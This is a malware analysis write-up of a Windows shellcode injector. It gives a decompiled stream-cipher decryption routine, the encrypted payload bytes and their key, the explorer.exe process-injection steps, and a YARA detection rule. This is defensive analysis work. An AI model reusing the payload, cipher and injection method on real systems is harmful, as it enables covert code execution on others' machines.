# Analysis of a shellcode

```
func_pointer.bin64: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows, 11 sections
SHA256: edd41b4a819f917f81203424730aaf0c24cc95e40acfc0f1bd90b11dadf58015
```

## Basic static analysis

The sample is only 24 kB and targeting x64 Windows systems. It is probably not packed or heavily obfuscated, at least not in a way that significantly expands its file size. A small size often suggests either a very simple piece of malware, a loader/dropper that downloads a larger payload, or a highly optimized and potentially assembly-heavy piece of code. This small footprint also implies it might not contain a large amount of embedded resources or complex libraries. Therefore, we should be able to begin direct analysis of its code without extensive unpacking efforts.

Opening the file in Die [](assets/die_compiler.png), we see that the the program has been written in C/C++, using MinGW compiler. We can even retrieve the compilation timestamp (in pestudio or CFF Explorer): `2023-04-06 15:21:17`.

## Detailed static analysis

After a series of initialization (code automatically added by MinGW), an encrypted payload is decrypted. The algorithm used is a stream cipher, derivating 3 keys from an original one, and XORing the source with a calculus made from these 3 keys, `BYTE` by `BYTE`. The key used here is `"UUUUUUUU"`.

```c
__int64 __fastcall stream_cipher(char *key, int key_length, _BYTE *src, int src_length, _BYTE *dest)
{
  __int64 result; // rax
  int next_key; // [rsp+10h] [rbp-20h]
  int k; // [rsp+14h] [rbp-1Ch]
  char XOR_key; // [rsp+1Bh] [rbp-15h]
  int j; // [rsp+1Ch] [rbp-14h]
  int i; // [rsp+20h] [rbp-10h]
  unsigned int key3; // [rsp+24h] [rbp-Ch]
  unsigned int key1; // [rsp+28h] [rbp-8h]
  unsigned int key0; // [rsp+2Ch] [rbp-4h]

  key0 = 0;
  key1 = 0;
  key3 = 0;
  for ( i = 0; i <= 63; ++i )                   // iterates 64 times to generates 3 keys derivated from original one
  {
    key0 = (2 * key0) | ((unsigned __int8)((key1 >> 21) ^ (key0 >> 18) ^ ((int)(unsigned __int8)key[i % key_length] >> (i / 8))) ^ (unsigned __int8)(key3 >> 22)) & 1;
    key1 = (2 * key1) | (key0 >> 8) & 1;
    key3 = (2 * key3) | (key1 >> 10) & 1;
  }
  for ( j = 0; ; ++j )
  {
    result = (unsigned int)j;
    if ( j >= src_length )
      break;
    next_key = (((key1 >> 10) ^ (unsigned __int8)(key3 >> 10)) & BYTE1(key0) ^ (key1 >> 10) & (unsigned __int8)(key3 >> 10)) & 1;
    XOR_key = 0;
    for ( k = 0; k <= 7; ++k )
    {
      XOR_key |= ((((key1 >> 21) ^ (unsigned __int8)(key3 >> 22)) & (unsigned __int8)(key0 >> 18) ^ (key1 >> 21) & (unsigned __int8)(key3 >> 22)) & 1 ^ next_key) << k;
      key0 = (2 * key0) | (((key1 >> 21) ^ (unsigned __int8)(key3 >> 22)) & (unsigned __int8)(key0 >> 18) ^ (key1 >> 21) & (unsigned __int8)(key3 >> 22)) & 1 ^ next_key;
      key1 = (2 * key1) | (key0 >> 8) & 1;
      key3 = (2 * key3) | (key1 >> 10) & 1;
    }
    dest[j] = XOR_key ^ src[j];
  }
  return result;
}
```

The encrypted data is as follows:

```
encrypted_payload db  8Dh,   9, 8Dh, 59h,0A0h, 1Fh, 83h, 0Ah, 9Eh, 86h, 28h,0B9h,0CAh, 73h,0E2h,0D7h, 1Dh
                                        ; DATA XREF: main+84↑o
                db  38h, 3Dh, 30h, 94h,0D5h,0FEh, 7Dh,0D0h, 32h, 64h,0D3h,0F5h, 0Fh, 29h, 3Eh, 95h,0ABh
                db  9Ch, 38h, 4Ch, 3Eh,0CBh,0E0h,0D3h,0CAh, 6Dh, 2Bh,0E2h, 59h, 18h,0FFh, 9Fh, 67h, 63h
                db  97h,0F9h, 9Bh, 54h,   6, 6Fh,0FCh,0E9h, 17h, 78h, 87h, 61h,0EAh,0CCh, 24h,   9, 49h
                db  80h,0E8h,0FFh,   0,0D1h,0D3h,0BAh, 5Ch, 2Fh, 72h,   1, 3Bh,0A2h, 0Ah, 74h,   9, 0Bh
                db 0C2h, 6Ch, 1Bh,   2, 0Ch, 14h,0A4h, 20h, 69h, 80h,0E9h, 3Ch, 27h,   9, 0Bh,0C2h,   2
                db 0AEh,   9,0CCh, 0Ch, 9Ah, 64h,0AAh, 45h,   9,   1, 49h, 91h,0E9h, 4Eh, 1Ah, 6Fh, 4Bh
                db 0BAh, 55h, 2Fh, 14h,0A9h, 4Dh, 28h, 9Eh,   5, 70h,0C3h, 5Ah, 63h, 50h, 2Eh,0C5h,0D5h
                db  6Dh, 2Dh, 60h,   4,0E8h, 70h,0A8h, 34h,0FBh, 2Ch, 1Eh, 93h,0CEh,0A0h, 1Ch,0E1h, 19h
                db 0F0h, 70h,0FFh, 10h, 76h,   5, 81h, 52h, 76h,0D9h, 83h, 54h, 72h, 9Ah, 61h,0AAh,   9
                db  61h, 76h, 0Ch,0CAh, 4Ah, 0Eh, 1Bh, 91h, 52h,0BAh, 55h, 2Fh, 24h,0A9h, 4Dh, 28h, 98h
                db    9, 19h, 4Bh, 4Ah, 0Ch,0C9h,0D8h,0C5h, 4Ch,0E5h, 79h, 60h, 5Fh, 61h,0CBh,0A4h, 61h
                db  4Bh, 40h,0ADh, 70h,0DAh,0C5h, 4Dh,0FEh, 1Eh, 69h, 8Eh, 3Bh,0A1h,   1,0BEh,0F5h,0EDh
                db  0Fh,0D9h, 45h, 45h, 14h,0A4h, 20h, 21h, 3Bh, 61h,0C5h,0DDh, 5Bh, 0Bh, 12h, 52h,0AEh
                db 0CEh,   9, 91h, 91h, 21h, 21h,   5, 61h, 79h, 81h,   0,0B0h, 57h,0D1h,0C6h, 85h, 7Bh
                db 0C1h, 1Fh,0C0h, 3Ch, 2Fh, 23h,   9,0F2h,0E7h, 9Fh,0AFh,0CFh, 6Fh, 57h,0CCh, 97h, 60h
                db    8, 1Dh,   3, 55h, 42h,0C8h,0BAh,0EAh, 67h, 57h, 2Bh,0C5h, 97h, 66h,0CBh, 4Ah, 21h
                db  5Ch, 68h,0C1h, 92h,0BEh,0DFh, 5Ah,   6,0D2h,0A2h,0D4h, 43h,0EAh,   0, 74h, 25h, 6Bh
                db  2Dh, 68h,   9, 6Bh, 62h, 22h,0E9h,0A2h, 84h, 14h,0A4h, 20h, 21h,   5, 29h, 48h,   0
                db  15h, 48h, 28h, 72h,0DDh,0E3h,0E8h, 46h,0C1h, 56h, 21h, 95h,0B9h
```

All sensitive function are loaded at runtime to avoid being detected in the imports. The PID of the running process launched by `explorer.exe` is retrieved, to then allocate memory remotely (`VirtualAllocEx`), write the decoded payload (`WriteProcessMemory`) and execute the code as a remote thread (`CreateRemoteThread`). 


## YARA

```php
rule injector {
	meta:
		description = "Generic shellcode injecting payload to explorer.exe"

	strings:
		$explorer = "explorer.exe"

		$func1 = "VirtualAllocEx"
		$func2 = "WriteProcessMemory"
		$func3 = "CreateRemoteThread"

		$key = "UUUUUUUU"

	condition:
		is_pe and
		$explorer and
		all of ($func*) and
		$key
}
```


